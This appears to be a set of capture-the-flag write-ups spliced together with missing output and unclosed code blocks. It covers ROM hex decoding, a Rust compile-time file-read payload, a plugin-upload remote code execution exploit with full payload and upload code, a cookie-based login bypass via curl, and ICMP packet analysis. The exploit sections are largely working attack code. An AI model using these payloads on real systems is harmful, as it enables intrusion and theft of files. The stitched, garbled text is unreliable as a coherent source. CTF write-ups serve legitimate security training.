## Hidden in the Cartridge

![Proof](/forensics/Hidden-in-the-Cartridge/proof.png)

**Author:** `AAntioch`  
**Solves:** 84

## Description

During a test session on the **Retro-Arcade emulator**, weâ€™re given a **corrupted copy of Space Invaders**.  
The game wonâ€™t boot, but the memory logs remain inside the ROM file.  

Rumor has it the developers left hidden messages in the test cartridges. Can we recover the flag?

We get: `Hidden_in_the_Cartridge.7z`

---

## Solve

I just used strings on the file
```bash
strings strings space_invaders.nes
```
 and saw something fishy:
```bash

Looking closer:

- `63` â†’ `c`  
- `74` â†’ `t`  
- `66` â†’ `f`  
- `7b` â†’ `{`  
- `7d` â†’ `}`  

Those are clearly **hex values** spelling out the flag.

So I copied all the suspicious fragments into [**/forensics/Hidden-in-the-Cartridge/hex.txt**](/forensics/Hidden-in-the-Cartridge/hex.txt) (one block per line).  
Then I wrote a tiny [**/forensics/Hidden-in-the-Cartridge/solve.py**](/forensics/Hidden-in-the-Cartridge/solve.py) to parse the file, strip the `$$$`, concatenate everything, and decode the hex.

Running it prints the full flag:

```bash
python solve.py hex.txt
Output:
Hex string: 6374667b396631623433383136346462633861363234396261356336366663306436313935623533383862656564383930363830626636313630323166323538323234387d

## Description

Aren't you tired of rust? I found the perfect solution for you! Welcome to RuginÄƒ. Since there is no compiler for it yet, I made one for you.  

---

## Solve

The compiler replaces `principal { ... }` with a `fn main { ... }` function and then runs **rustc**.  
All compiler errors are shown back to us in the browser.  
That means we can abuse Rust compile-time macros:

- `include_str!("/path")` reads a file at **compile time**  
- `compile_error!(...)` stops compilation and prints a message

So if we wrap the flag file in `compile_error!(include_str!(...))`, the compiler error will literally contain the file contents.

Final payload:

```rust
principal { compile_error!(include_str!("/flag.txt")); }
```

## Description

This isn't wordpress...

We get: `Server.py`
---

## Vulnerabilities

* Arbitrary Code Execution: Uploaded `init.py` is executed with `subprocess.run([...], cwd=plugin_dir)` with no sandboxing.
* Hard-coded symmetric key: `KEY = b"SECRET_KEY!123456XXXXXXXXXXXXXXX"` allows anyone to craft valid `.plugin` packages.
* Log exposure vector: Flag is printed to stdout by the official plugin and captured in `/opt/app/app.log`.
* Store gating by plugin count: Downloading from `/store` is gated by `len(registry) > 2`, which can be trivially reached by uploading benign plugins.

---

## Exploit Overview

1. Build a valid `.plugin` archive (zip), place an `init.py` that reads `/opt/app/app.log` and writes it into the plugin's own `index.html`.
2. Encrypt the zip using the known AES-CBC key (prepend a random IV), producing a `.plugin` file.
3. Upload the `.plugin` to the portal. The server will decrypt, extract, and execute `init.py`.
4. Visit `/widget/<your-uid>` â€” the server will serve the `index.html` you created, which contains the contents of the server log, including the flag line.
5. Parse the flag from the served page (it appears as `You cannot see this MUHAHAHAHA: <FLAG>` in the log).

---

## Solve.py

### 1. Payload that runs on the server:
```python
INIT_PY = r'''
import os, html
from pathlib import Path
plug = Path(__file__).resolve().parent
src = "/opt/app/app.log"
try:
    data = Path(src).read_text(errors="ignore")
except Exception as e:
    data = f"[read error] {e}"
html_out = "<!doctype html><meta charset='utf-8'><title>log</title><pre>" + html.escape(data) + "</pre>"
(plug / "index.html").write_text(html_out)
print("ok")
'''
```
This string becomes the init.py file inside the plugin ZIP.   
When the server executes init.py, it:
  Reads /opt/app/app.log (where the server logged the official pluginâ€™s stdout that contains the flag).   
  Builds a minimal HTML page wrapping the log (escaped so itâ€™s safe to view).   
  Writes that page to index.html inside the plugin directory.   
  Prints "ok" to stdout (server captures stdout in logs too).   
Result: after upload + execution, visiting /widget/<uid> will serve the index.html we just wrote (i.e., the server log).   


### 2. Build plugin ZIP (in-memory)

Create a ZIP containing the files the portal expects:
```bash
- plugin_manifest.json   # {"name": NAME, "version":"1.0", "author":"me", "icon":"thumbnail.svg"}
- thumbnail.svg          # small dashboard icon
- index.html             # placeholder (payload will overwrite this on the server)
- init.py                # the payload (INIT_PY) shown above
```

### 3. Encrypt to .plugin format

The server expects a .plugin file to be the IV (16 bytes) followed by AES-CBC(KEY, Padded(ZIP)). Steps:
```python
iv = os.urandom(16)                         # random 16-byte IV
ciphertext = AES.new(KEY, AES.MODE_CBC, iv).encrypt(pad(zip_bytes, AES.block_size))
plugin_blob = iv + ciphertext               # file contents to upload
*Because the server uses a hard-coded key (KEY) we can produce a valid .plugin.
```

### 4. Upload the plugin

POST the .plugin to /upload as multipart form data:
```python
files = {'file': ('exploit.plugin', plugin_blob, 'application/octet-stream')}
requests.post(f"{BASE}/upload", files=files)
```

On the server this triggers:
```bash
Save uploaded file.
Decrypt using KEY.
Extract the zip into a new plugins/<uid>/ directory.
Execute init.py with subprocess.run(..., cwd=plugin_dir) â€” our payload runs now.
```

### 5. Find your plugin UID on the dashboard

After upload the dashboard (/) shows a widget card for the plugin. Scrape it to get the UID:
```python
<a class="link" href="/widget/<uid>">LOG_RIPPER</a>
```
The UID is used to fetch /widget/<uid> which serves that pluginâ€™s index.html.

### 6. Fetch the widget page (exfiltrate the log)

GET /widget/<uid> â€” the server will now serve the index.html our payload wrote, which contains the escaped contents of /opt/app/app.log.

Save it locally for inspection:
```python
page = requests.get(f"{BASE}/widget/{uid}").text
open("widget_log.html","w").write(page)
```

### 7. Check for flag

```python
def extract_flags(text):
    pats = [r"CTF\{[^}]+\}", r"UPT\{[^}]+\}", r"flag\{[^}]+\}"]
    found = []
    for p in pats:
        found += re.findall(p, text, flags=re.IGNORECASE)
    m = re.search(r"MUHAHAHAHA:\s*([A-Za-z0-9_\-\{\}]+)", text)
    if m: found.append(m.group(1))
    seen = set(); out=[]
    for f in found:
        if f not in seen:
            seen.add(f); out.append(f)
    return out

...
# in main...
flags = extract_flags(page)
    if flags:
        print("flags found:")
        for f in flags: print("   ", f)
    else:
        print("no flag")
```

## Recon

We can see just a simple web page with a login screen.

When we try to do a curl with some tests for login we get this reponse:

```bash
$ curl -i -X POST http://ctf.ac.upt.ro:9622/login   -H 'Content-Type: application/x-www-form-urlencoded'   --data 'username=test&password=wrong'

HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.11.13
Date: Tue, 16 Sep 2025 16:50:41 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1107
Set-Cookie: logged_in=False; Path=/
Connection: close
```

Clearly the **logged_in=False** is a huge discovery.
Because by simply making a request with **logged_in=True** we could bypass the login entirely!

## Solve

```bash
$ curl -i -H 'Cookie: logged_in=True' http://ctf.ac.upt.ro:9622
HTTP/1.1 302 FOUND
Server: Werkzeug/3.1.3 Python/3.11.13

<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/gallery">/gallery</a>. If not, click the link.
```

That's exactly what we wanted, we can do this ourselves on the browser using a Cookie Editor plugin!

## Solve

Analizing the packets I find some
```bash
GET /pageN.html
UDP bursts
ICMP Echo
```

The ICMP Packets we re important because:
1. this is how a ICMP Echo packet looks like

```bash
Type (1) | Code (1) | Checksum (2) | Identifier (2) | Sequence (2) | Data ...
```

For us it carried Base64 strings which we're part of the flag!

```bash
icmp && (icmp.type == 8 || icmp.type == 0) && data.len > 0
```

using this filter in wireshark and looking only with id=1337!

![packet](/forensics/unknown-traffic1/packet.png)

We can use the solve.py to automate this!
